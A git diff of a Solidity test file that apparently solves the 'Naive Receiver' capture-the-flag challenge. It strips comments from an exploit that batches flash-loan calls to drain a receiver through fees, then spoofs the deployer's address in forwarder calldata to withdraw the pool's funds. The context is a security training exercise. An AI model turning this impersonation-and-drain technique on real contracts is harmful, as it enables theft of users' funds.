@@ -91,31 +91,21 @@ contract NaiveReceiverChallenge is Test {
             callDatas[i] = abi.encodeCall(
                 NaiveReceiverPool.flashLoan,
                 (receiver, address(weth), 1, "0x")
-            ); //We are filling the static array callDatas with the necessary encoded calls to call.
-            //function we want to call and the parameters to pass
+            );
         }
-        // Above are 10 calls pumped into callDatas
-        // The 11th call into callDatas, is the one to empty out the pool.
 
-        //encoding the 11th call
+        //encoding the 11th call - to call withdraw as an impersonated deployer
         callDatas[10] = abi.encodePacked(
             abi.encodeCall(
                 NaiveReceiverPool.withdraw,
                 (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
             ),
             bytes32(uint256(uint160(deployer)))
-            /*This is encoding the deployer address to the call to be passed to the basic forwarder.
-             *This is because we need to have the last 20 bytes equal to that of the deployer for impersonation.*/
         );
-        /**
-         * We are deploying and making the call on behalf of the deployer
-         */
 
         //Encode and ready for the multicall
         bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
-        //pool.multicall because pool is multicall i.e. inherited into it this
 
-        //Now we want to make sure the call goes through the basic forwarder
         //Create the request for the forwarder
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
@@ -126,10 +116,6 @@ contract NaiveReceiverChallenge is Test {
             multicallData,
             1 days
         );
-        //Above it is BasicForwarder and not the initialized instance of the forwarder. This because of the reference to the imported version. The basic forwarder has to be a standing logic by itself.
-        /**
-         * forwarder.nonces(player), //This is like this because it needs call from the initialized instance
-         */
 
         //Now we create a requestHash
         bytes32 requestHash = keccak256(
